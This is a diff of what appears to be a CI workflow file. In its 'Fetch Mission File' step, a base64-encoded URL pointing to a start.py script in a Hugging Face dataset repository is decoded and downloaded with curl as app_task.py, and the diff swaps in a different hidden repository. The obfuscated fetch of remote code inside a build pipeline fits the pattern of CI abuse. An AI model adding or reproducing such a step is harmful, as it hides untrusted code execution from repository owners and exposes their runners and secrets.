@@ -65,7 +65,7 @@ jobs:
       - name: Fetch Mission File
         run: |
           echo "[MISSION] Fetching app_task.py from designated repository vault..."
-          REPO_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          REPO_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$REPO_VAULT" -o app_task.py
           echo "[MISSION] Mission file fetched."
 
